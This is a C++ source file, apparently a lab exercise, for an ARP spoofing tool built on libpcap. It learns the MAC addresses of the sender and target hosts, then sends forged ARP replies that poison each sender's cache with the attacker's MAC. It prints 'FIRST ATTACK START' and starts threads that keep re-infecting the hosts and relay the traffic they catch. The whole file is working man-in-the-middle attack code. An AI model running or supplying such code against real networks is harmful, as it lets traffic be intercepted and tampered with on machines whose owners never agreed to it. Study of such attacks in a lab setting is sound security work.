#include "getmyaddr.h"
#include "arpfunc.h"

int main(int argc, char* argv[]) {
	if (argc < 4) {
		usage();
		return false;
	}

	Attackerinfo attacker;
	uint8_t my_mac[6] = {0x00};
	getMacAddress(my_mac, argv[1]); //get my mac address
	attacker.mac = my_mac;
	attacker.ip = getIPAddress(argv[1]);

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", argv[1], errbuf);
		return -1;
	}

	int res;
	int flow = (argc-2)/2;
	EthArpPacket packet;
	Node* victim = new Node[flow];
	printf("=====FIRST ATTACK START=====\n");
	for(int i = 2;i<argc;i+=2)
	{
		victim[i/2 - 1].sender_ip = Ip(argv[i]);
		victim[i/2 - 1].target_ip = Ip(argv[i+1]);
		makeArpPacket(&packet, Mac("ff:ff:ff:ff:ff:ff"), attacker.mac, Mac("00:00:00:00:00:00"), attacker.mac, attacker.ip, victim[i/2 - 1].sender_ip, req);
		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		victim[i/2 - 1].sender_mac = getotherMac(handle, victim[i/2 - 1].sender_ip);
		makeArpPacket(&packet, victim[i/2 - 1].sender_mac, attacker.mac, victim[i/2 - 1].sender_mac, attacker.mac, victim[i/2 - 1].target_ip, victim[i/2 - 1].sender_ip, rep);
		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		victim[i/2 - 1].target_mac = getotherMac(handle, victim[i/2 - 1].target_ip);
	}
	printf("======FIRST ATTACK END======\n");

	thread sendthr(handle, send_thread, &attacker, victim, flow);
	thread catchthr(catch_thread, &attacker, victim, flow);
	thread releasethr(release_thread, &attacker, victim, flow);
	sendthr.join();
	catchthr.join();
	releasethr.join();

	pcap_close(handle);
}